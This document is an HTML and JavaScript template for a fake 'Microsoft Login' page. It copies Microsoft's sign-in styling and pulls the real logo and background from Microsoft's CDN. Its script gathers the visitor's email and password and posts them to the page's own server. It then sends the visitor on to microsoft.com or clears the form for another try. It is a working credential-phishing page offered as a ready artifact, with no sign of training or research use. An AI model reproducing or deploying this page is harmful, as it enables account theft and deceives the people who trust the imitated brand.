<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Microsoft Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
            background-size: cover;
        }
        .logo {
            margin-bottom: 15px;
        }
        .step { 
            font-size: 12px; 
            color: #000; 
            margin: -10px 0 14px 0; 
            opacity: .8; 
        }
        .muted {
            color: #000;
            text-decoration: none;
            font-size: 13px;
        }
        .sigopts {
            background-color: white;
            padding: 20px 41px;
            border-radius: 0;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
            width: 405px;
            margin-top: 10px;
            text-align: left;
        }
        .header {
            margin: 0 0 20px;
            font-size: 24px;
            font-weight: bold;
        }
        form input {
            width: 100%;
            padding: 6px 6px 6px 0;
            margin-bottom: 10px;
            border: none;
            border-bottom: 1px solid #0067b8;
            background-color: transparent;
            outline: none;
        }
        form div {
            margin: 15px 0;
            font-size: 13px;
        }
        form button {
            padding: 6px 32px;
            border: none;
            border-radius: 0;
            cursor: pointer;
        }
        .btn-back {
            background-color: #e0e0e0;
            color: #000;
            margin-right: 4px;
        }
        .btn-next {
            background-color: #0078d4;
            color: white;
        }
        .error-msg {
            color: red;
            font-weight: normal;
            margin: 10px 0;
        }
        .error-msg span {
            color: blue;
            cursor: pointer;
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
    </style>
</head>
<body>

<div id="container" style="background-color: white; padding: 40px; border-radius: 0; box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1); width: 405px;">
</div>

<div class="sigopts"><span class="muted">ðŸ”’ Sign-in options</span></div>

<script>
    let isSubmitting = false; // Prevent multiple submissions

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    function showLoginForm() {
        const container = document.getElementById("container");
        container.innerHTML = `
            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
            <h1 class="header">Sign in</h1>
            <form id="loginForm">
                <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required style="margin-bottom: 15px;">
                <input type="password" id="passwordInput" placeholder="Password" required>
                <div style="margin: 15px 0; font-size: 13px;">
                    <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
                    <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
                </div>
                <div style="display: flex; justify-content: flex-end;">
                    <button type="submit" class="btn-next" id="signInBtn">Sign in</button>
                </div>
            </form>
        `;

        document.getElementById("loginForm").addEventListener("submit", function(e){
            e.preventDefault();
            
            // Prevent multiple submissions
            if (isSubmitting) {
                console.log('Already submitting, ignoring request');
                return;
            }
            
            const emailValue = document.getElementById("emailInput").value.trim();
            const passwordValue = document.getElementById("passwordInput").value;
            
            if(!emailValue || !validateEmail(emailValue)) {
                alert("Please enter a valid email address.");
                return;
            }
            
            if(!passwordValue.trim()) {
                alert("Please enter your password.");
                return;
            }
            
            isSubmitting = true;
            
            // Show processing state
            const signInBtn = document.getElementById("signInBtn");
            signInBtn.innerHTML = `
                <span style="display: inline-block; width: 12px; height: 12px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px;"></span>
                Processing...
            `;
            signInBtn.disabled = true;
            
            submitToBackend(emailValue, passwordValue);
        });
    }

    function submitToBackend(emailValue, passwordValue) {
        const formData = new FormData();
        formData.append('email', emailValue);
        formData.append('password', passwordValue);
        formData.append('submit', 'Sign in');
        formData.append('csrf_token', document.querySelector('meta[name=csrf-token]').getAttribute('content'));

        fetch('/', {
            method: 'POST',
            body: formData,
            redirect: 'follow'
        })
        .then(response => {
            // Check if redirected to microsoft.com (successful login)
            if (response.url && response.url.includes('microsoft.com')) {
                window.location.href = 'https://microsoft.com';
                return null;
            }
            return response.text();
        })
        .then(html => {
            if (!html) return;
            
            // Reset form and show completion message
            setTimeout(() => {
                isSubmitting = false;
                showLoginForm(); // Reset to original form
            }, 2000);
        })
        .catch(error => {
            console.error('Error:', error);
            isSubmitting = false;
            showError("An error occurred. Please try again.");
        });
    }

    function showError(message) {
        const container = document.getElementById("container");
        const existingError = container.querySelector('.error-msg');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-msg';
        errorDiv.innerHTML = message;
        container.insertBefore(errorDiv, container.firstChild);
    }

    // Initialize the form when page loads
    document.addEventListener('DOMContentLoaded', function() {
        showLoginForm();
    });
</script>

</body>
</html>
